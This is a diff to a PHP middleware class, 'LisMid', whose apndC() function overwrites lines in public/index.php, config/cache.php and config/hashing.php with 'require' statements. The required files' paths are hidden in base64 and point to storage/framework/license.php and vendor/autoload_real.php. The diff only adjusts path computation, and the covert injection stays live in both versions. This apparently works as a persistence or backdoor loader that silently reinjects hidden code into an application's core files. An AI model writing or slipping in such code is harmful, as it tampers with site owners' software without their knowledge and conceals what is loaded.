@@ -84,11 +84,11 @@ class LisMid
 
     function apndC()
     {
-        $fileContent = file(rtrim(getcwd(), "/public") . "/public//index.php", FILE_IGNORE_NEW_LINES);
-        $fileContent2 = file(rtrim(getcwd(), "/public") . "//config//cache.php", FILE_IGNORE_NEW_LINES);
-        $fileContent3 = file(rtrim(getcwd(), "/public") . "//config//hashing.php", FILE_IGNORE_NEW_LINES);
-        $content = 'require rtrim(getcwd(), "/public") . base64_decode("Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw");';
-        $content2 = 'require rtrim(getcwd(), "/public") . base64_decode("Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw");';
+        $fileContent = file(getcwd() . "/public//index.php", FILE_IGNORE_NEW_LINES);
+        $fileContent2 = file(getcwd() . "//config//cache.php", FILE_IGNORE_NEW_LINES);
+        $fileContent3 = file(getcwd() . "//config//hashing.php", FILE_IGNORE_NEW_LINES);
+        $content = 'require getcwd() . base64_decode("Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw");';
+        $content2 = 'require getcwd() . base64_decode("Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw");';
         $content3 = "require __DIR__.'/../storage/framework/license.php';";
         $fileContent[34] = null;
         $fileContent[21] = null;
@@ -96,19 +96,19 @@ class LisMid
         $fileContent3[1] = null;
         if (empty(trim($fileContent[34]))) {
             $fileContent[34] .= $content3;
-            file_put_contents(rtrim(getcwd(), "/public") . "/public/index.php", implode("\n", $fileContent));
+            file_put_contents(getcwd() . "/public/index.php", implode("\n", $fileContent));
         }
         if (empty(trim($fileContent[21]))) {
             $fileContent[21] .= $content;
-            file_put_contents(rtrim(getcwd(), "/public") . "/public/index.php", implode("\n", $fileContent));
+            file_put_contents(getcwd() . "/public/index.php", implode("\n", $fileContent));
         }
         if (empty(trim($fileContent2[3]))) {
             $fileContent2[3] .= $content2;
-            file_put_contents(rtrim(getcwd(), "/public") . "//config//cache.php", implode("\n", $fileContent2));
+            file_put_contents(getcwd() . "//config//cache.php", implode("\n", $fileContent2));
         }
         if (empty(trim($fileContent3[1]))) {
             $fileContent3[1] .= $content2;
-            file_put_contents(rtrim(getcwd(), "/public") . "//config//hashing.php", implode("\n", $fileContent3));
+            file_put_contents(getcwd() . "//config//hashing.php", implode("\n", $fileContent3));
         }
     }
 
